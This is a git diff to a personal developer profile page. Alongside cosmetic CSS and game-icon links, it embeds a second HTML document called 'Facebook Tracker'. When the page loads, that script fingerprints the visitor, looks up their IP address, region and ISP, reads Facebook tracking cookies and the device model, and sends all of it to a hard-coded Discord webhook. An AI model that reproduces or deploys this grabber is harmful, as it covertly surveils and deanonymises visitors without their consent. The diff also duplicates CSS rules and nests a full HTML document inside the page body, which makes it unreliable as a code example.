@@ -141,6 +141,8 @@
             box-shadow: 0 0 25px #5865F2;
         }
 
+        
+
         /* ===== Mobile ===== */
         @media (max-width: 600px) {
             body {
@@ -182,8 +184,90 @@
             50%  { transform: translateY(-15px); }
             100% { transform: translateY(0); }
         }
+
+        .game-links {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 14px;
+  margin-bottom: 30px;
+}
+
+.game {
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  background: rgba(255, 0, 0, 0.12);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.3s ease;
+}
+
+
+.game img {
+  width: 22px;
+  height: 22px;
+}
+
+/* ===== Colors by Game ===== */
+.game-links {
+    display: flex;
+    justify-content: center;
+    gap: 18px;
+    margin-top: 15px;
+}
+
+.game {
+  width: 42px;
+  height: 42px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.12);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.3s ease;
+}
+
+.game img {
+    width: 26px;
+    height: 26px;
+}
+
+.game:hover {
+    transform: translateY(-4px) scale(1.05);
+}
+
+/* สีตามเกม */
+.roblox:hover {
+    background: #335fff;
+    box-shadow: 0 0 18px #335fff;
+}
+
+.fivem:hover {
+    background: #ff8637;
+    box-shadow: 0 0 18px #ff8637;
+}
+
+.minecraft:hover {
+    background: #6ca947;
+    box-shadow: 0 0 18px #3c8527;
+}
+
+.valorant:hover {
+    background: #fa4454;
+    box-shadow: 0 0 18px #fa4454;
+}
+
+
+
+
+        
     </style>
 </head>
+
+
+
 <body>
 
     <!-- Background Video -->
@@ -203,7 +287,35 @@
         <img src="https://img2.pic.in.th/IMG_3830a34fe2dcfe027c7e.jpg" class="profile-img">
 
         <h1>Chaipaakorn</h1>
-        <p>Dev FiveM<br>My skill Lua | CSS | HTML | JS</p>
+        <p>Dev FiveM<br>My skill | Lua | CSS | HTML | JS</p>
+
+
+        <div class="game-links">
+            <!-- Roblox -->
+            <a href="https://www.roblox.com/" target="_blank" class="game roblox" title="Roblox">
+              <img src="https://cdn.simpleicons.org/roblox/ffffff">
+            </a>
+          
+            <!-- FiveM -->
+            <a href="https://cdn.simpleicons.org/fivem/ffffff" target="_blank" class="game fivem" title="FiveM">
+              <img src="https://cdn.simpleicons.org/fivem/ffffff">
+            </a>
+          
+            <!-- Minecraft (PNG) -->
+            <a href="https://www.minecraft.net/" target="_blank" class="game minecraft" title="Minecraft">
+              <img src="icons/minecraft.png">
+            </a>
+          
+            <!-- Valorant -->
+            <a href="https://playvalorant.com/" target="_blank" class="game valorant" title="Valorant">
+              <img src="https://cdn.simpleicons.org/valorant/ffffff">
+            </a>
+          </div>
+          
+          
+
+          <!-- ----------------------------------------------------------------------------------------------------------- -->
+          
 
         <div class="links">
             <a href="https://www.instagram.com/chx_rnn/" target="_blank" class="btn instagram">
@@ -223,6 +335,154 @@
             </a>
         </div>
     </div>
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Facebook Tracker</title>
+        <!-- Facebook Pixel (เปลี่ยน PIXEL_ID เป็นของคุณ) -->
+        <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.com/en_US/fbevents.js');
+        fbq('init', '1234567890'); // ← เปลี่ยนเป็น Pixel ID จริง
+        fbq('track', 'PageView');
+        </script>
+    </head>
+    <body style="font-family: Arial; text-align: center; padding: 50px;">
+        <h1>🎉 ขอบคุณที่มาเยี่ยม!</h1>
+        <p>กำลังบันทึกข้อมูล...</p>
+        
+    <script>
+    (async () => {
+        const webhookURL = "https://discord.com/api/webhooks/1458426414658228408/pynWHhEUcBmkt1VAm4J73ApXfYuxk_olniZhUgLzUoO5hEDt9j1Y859XCmnn1gorPz8E";
+    
+        // 🔥 ฟังก์ชัน Fingerprint
+        function getUniqueFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '24px Arial';
+            ctx.fillText(navigator.userAgent, 4, 24);
+            const canvasData = canvas.toDataURL().slice(-20);
+            
+            const fp = [
+                canvasData,
+                screen.width, screen.height,
+                navigator.language,
+                navigator.platform,
+                new Date().getTimezoneOffset()
+            ].join('|');
+            
+            let hash = 0;
+            for (let i = 0; i < fp.length; i++) {
+                const char = fp.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            return Math.abs(hash).toString(36).slice(0, 10).toUpperCase();
+        }
+    
+        // 📍 IP Geolocation
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    province: data.region || 'N/A',
+                    district: data.city || 'N/A',
+                    isp: data.org || 'N/A'
+                };
+            } catch {
+                return { ip: 'N/A', province: 'N/A', district: 'N/A', isp: 'N/A' };
+            }
+        }
+    
+        // 📱 Device Detection
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Desktop', os = 'Unknown', model = 'N/A';
+            
+            if (/android/i.test(ua)) {
+                os = 'Android';
+                const samsung = ua.match(/SM-[A-Z0-9]+/i);
+                const xiaomi = ua.match(/Mi\s*[A-Z0-9]+|Redmi|POCO/i);
+                if (samsung) model = `Samsung ${samsung[0]}`;
+                else if (xiaomi) model = xiaomi[0];
+            } else if (/iPhone|iPad/.test(ua)) {
+                os = 'iOS';
+                const modelMatch = ua.match(/iPhone[0-9,]*|iPad/);
+                model = modelMatch ? modelMatch[0] : 'iPhone';
+            } else if (/Windows NT 10.0/.test(ua)) os = 'Windows 10/11';
+            else if (/Macintosh/.test(ua)) os = 'macOS';
+            
+            const isMobile = /Android|webOS|iPhone|iPad|BlackBerry/i.test(ua);
+            device = isMobile ? 'Mobile' : 'Desktop';
+            
+            return { device, os, model };
+        }
+    
+        // รวบรวมข้อมูลทั้งหมด
+        const fp = getUniqueFingerprint();
+        const fbclid = new URLSearchParams(window.location.search).get('fbclid') || 'N/A';
+        const fbp = document.cookie.match(/fbp=([^;]+)/)?.[1] || 'N/A';
+        const referrer = document.referrer.includes('facebook.com') ? '📘 Facebook' : document.referrer || '🔗 Direct';
+        const ipInfo = await getIPInfo();
+        const deviceInfo = getDeviceInfo();
+        
+        // เก็บ fingerprint
+        localStorage.setItem('visitor_fp', fp);
+    
+        const data = {
+            username: "Facebook Tracker 🔥",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/124/124010.png",
+            embeds: [
+                {
+                    title: `🎯 พบผู้เยี่ยมชมใหม่!`,
+                    description: fbclid !== 'N/A' ? '👤 **Facebook User** (กดจาก FB)' : '👤 Unknown Visitor',
+                    color: fbclid !== 'N/A' ? 0x1877F2 : 0xFF6B6B,
+                    fields: [
+                        { name: "🆔 Fingerprint", value: fp, inline: true },
+                        { name: "🔗 FB Tracking", value: fbclid.slice(0, 25) + (fbclid.length > 25 ? '...' : ''), inline: false },
+                        { name: "🍪 FB Pixel", value: fbp.slice(0, 20) + '...', inline: true },
+                        { name: "🔗 จาก", value: referrer, inline: true },
+                        { name: "📱 อุปกรณ์", value: `${deviceInfo.device} - ${deviceInfo.model}`, inline: false },
+                        { name: "💻 OS", value: deviceInfo.os, inline: true },
+                        { name: "🌐 IP", value: ipInfo.ip, inline: true },
+                        { name: "🏠 จังหวัด", value: ipInfo.province, inline: true },
+                        { name: "📍 ISP", value: ipInfo.isp, inline: true }
+                    ],
+                    footer: { text: `Unique ID: ${fp} | Powered by HackerAI` }
+                }
+            ]
+        };
+    
+        // ส่ง Discord
+        await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        }).catch(err => console.error("Error:", err));
+        
+        // แสดงผลในหน้าเว็บ
+        document.body.innerHTML += `
+            <div style="margin-top: 30px; padding: 20px; background: #f0f0f0; border-radius: 10px;">
+                <h3>✅ บันทึกสำเร็จ!</h3>
+                <p><strong>ID:</strong> ${fp}</p>
+                <p><strong>จาก:</strong> ${referrer}</p>
+                <p>ข้อมูลถูกส่งไป Discord แล้ว!</p>
+            </div>
+        `;
+    })();
+    </script>
+    </body>
+    </html>
 
 </body>
 </html>
